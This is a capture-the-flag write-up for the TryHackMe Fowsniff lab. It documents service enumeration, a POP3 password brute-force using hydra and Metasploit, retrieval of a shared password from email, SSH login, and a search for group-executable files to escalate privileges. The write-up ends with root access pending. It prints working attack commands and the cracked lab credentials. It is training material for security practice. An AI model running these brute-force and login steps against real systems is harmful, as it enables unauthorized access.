# TryHackMe - Fowsniff CTF  
🔗 https://tryhackme.com/room/fowsniff

## 🎯 Objective

Enumerate services, perform brute-force attack on POP3 credentials, analyze received emails to extract passwords, access via SSH, and escalate privileges via group-based file discovery.

---

## 🖥️ Target Information

| Property     | Value                                   |
|--------------|------------------------------------------|
| IP Address   | 10.10.81.195                            |
| Services     | 22/tcp (SSH), 80/tcp (HTTP),            |
|              | 110/tcp (POP3), 143/tcp (IMAP)          |
| Web Server   | Apache 2.4.18 (Ubuntu)                  |
| SSH Server   | OpenSSH 7.2p2 Ubuntu 4ubuntu2.4         |

---

## 🔍 1. Enumeration

### 🔧 Nmap Scan
```bash
nmap -sV -O 10.10.81.195
```

- 22/tcp: OpenSSH 7.2p2
- 80/tcp: Apache 2.4.18
- 110/tcp: Dovecot pop3d
- 143/tcp: Dovecot imapd

---

### 🔍 Gobuster Scan
```bash
gobuster dir -u http://10.10.81.195 -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt

gobuster dir -u http://10.10.247.215/as -w /usr/share/wordlists/dirb/common.txt -x php
```

💡 JavaScript shows compatibility fix for old WP browsers — not exploitable.

---

## 🔐 2. POP3 Credential Brute-Force

### Manual check
```bash
nc 10.10.81.195 110
```
- Server responds → POP3 is live.

### Hydra attempt (timeout issue)
```bash
hydra -l seina -P /usr/share/wordlists/rockyou.txt -f -o found.txt pop3://10.10.81.195
```

❌ Long timeout — switched to Metasploit

---

### ✅ Metasploit Method
```bash
msfconsole

use auxiliary/scanner/pop3/pop3_login
set RHOSTS 10.10.81.195
set USERNAME seina
set PASS_FILE /usr/share/wordlists/rockyou.txt
set STOP_ON_SUCCESS true
set THREADS 10
set VERBOSE false
set CONNECT_TIMEOUT 5
run
```

✅ Cracked Password: `scoobydoo2`

---

## 📬 3. Mail Access via POP3

```bash
nc 10.10.81.195 110

USER seina
PASS scoobydoo2
LIST
RETR 1
```

📧 Message contains:
```
All users’ temporary password: S1ck3nBluff+secureshell
```

---

## 🔑 4. SSH Access (new user)

Try the password with `baksteen`:
```bash
ssh baksteen@10.10.81.195
Password: S1ck3nBluff+secureshell
```

```bash
id
```

Result:
```
uid=1004(baksteen) gid=100(users) groups=100(users),1001(baksteen)
```

---

## 🔓 5. Privilege Escalation

Search for group-executable files:
```bash
find / -gid 100 -perm -g=x -type f 2>/dev/null
```

Discovered:
```
/opt/cube/cube.sh
```

✅ Further analysis needed on `cube.sh`

---

## ✅ Summary

| Phase                  | Status                          |
|-----------------------|----------------------------------|
| Service Enumeration    | ✅ Nmap + Gobuster               |
| POP3 Brute Force       | ✅ Password found via Metasploit |
| Email Analysis         | ✅ Found shared password         |
| SSH Access             | ✅ baksteen                      |
| Privilege Enumeration  | ✅ Group-based search success    |
| Root/Final PrivEsc     | 🕓 Pending cube.sh analysis      |
